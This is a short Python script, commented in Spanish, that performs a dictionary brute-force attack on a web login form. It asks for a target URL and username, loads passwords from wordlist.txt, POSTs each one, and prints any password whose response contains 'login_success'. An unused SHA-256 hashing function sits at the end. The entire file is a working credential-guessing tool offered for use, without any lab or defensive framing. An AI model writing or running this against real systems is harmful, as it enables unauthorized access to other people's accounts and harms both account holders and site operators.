# pip install requests
import hashlib
import requests

HASH_ALGORITHM = "sha256"
FILENAME = "wordlist.txt"


def main():
    # Obtén la URL del formulario de login desde el usuario
    login_url = input("Introduce la URL del formulario de login: ")

    # Obtén el nombre de usuario desde el usuario
    username = input("Introduce el nombre de usuario: ")

    # Inicia el proceso de fuerza bruta de contraseñas
    brute_force_passwords(login_url, username)


def brute_force_passwords(login_url, username):
    # Obtén la lista de contraseñas desde el archivo wordlist.txt
    passwords = load_passwords()

    # Itera sobre las contraseñas y prueba cada una
    for password in passwords:
        # Realiza el envío de la solicitud HTTP POST al formulario de login
        login_successful = perform_login(login_url, username, password)

        # Verifica si el login fue exitoso
        if login_successful:
            print("Contraseña encontrada:", password)
            return  # Si se encuentra la contraseña, se termina el programa

    print("No se encontró la contraseña en la lista.")


def perform_login(login_url, username, password):
    try:
        # Crea los datos de la solicitud (nombre de usuario, contraseña, etc.)
        data = {"username": username, "password": password}

        # Realiza la solicitud HTTP POST al formulario de login
        response = requests.post(login_url, data=data)

        # Verifica si el login fue exitoso analizando la respuesta
        if response.ok:
            response_body = response.text
            if "login_success" in response_body:
                # El login fue exitoso
                return True
            else:
                # El login no fue exitoso
                return False
        else:
            return False  # El login no fue exitoso

    except Exception as e:
        return False  # Manejo de errores y excepciones


def load_passwords():
    passwords = []

    try:
        with open(FILENAME, "r") as file:
            passwords = [line.strip() for line in file]

    except Exception as e:
        print("Error al cargar las contraseñas:", str(e))

    return passwords


def hash_password(password):
    try:
        hashed_bytes = hashlib.sha256(password.encode("utf-8")).digest()
        hashed_password = ''.join(format(byte, '02x') for byte in hashed_bytes)
        return hashed_password
    except Exception as e:
        print("Error al generar el hash de la contraseña:", str(e))
        return None


if __name__ == "__main__":
    main()
